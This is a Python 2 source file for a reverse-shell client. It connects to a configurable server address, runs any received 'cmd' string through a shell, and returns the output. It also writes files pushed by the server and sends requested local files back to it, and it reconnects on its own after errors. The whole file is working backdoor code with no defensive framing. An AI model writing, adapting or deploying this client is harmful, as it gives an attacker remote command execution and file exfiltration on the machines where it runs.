#!/usr/bin/env python
import os
import socket
import subprocess
import network as net
import files as files

SERVER_IP = '127.0.0.1'
PORT_NUM = 5555


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

class Client(object):
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def listen(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            self.consoleWithServer()
        except KeyboardInterrupt:
            raise
        except Exception as e:
            print e
            self.listen()
    
    def consoleWithServer(self):
        command = ''
        while True:
            command = net.recvAll(self.sock)
            print command
            
            if 'cmd' in command:
                splited_cmd = command.split(' ')
                if splited_cmd[1] in 'cd':
                    print splited_cmd[2]
                    os.chdir(splited_cmd[2])
                    continue
                cmd = subprocess.Popen(command[3:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                net.sendAll(self.sock ,output_bytes)
                continue
            
            splited_cmd = command.split(' ')
            
            if 'sendfile' in command:
                data = net.recvAll(self.sock)
                files.createFileWithData(splited_cmd[2],data)
                continue

            if 'getfile' in command:
                data = files.getFileData(splited_cmd[1])
                if data == None:
                    data = 'Error get file'
                    continue
                net.sendAll(self.sock,data)

if __name__ == "__main__":
    Client( SERVER_IP, PORT_NUM).listen()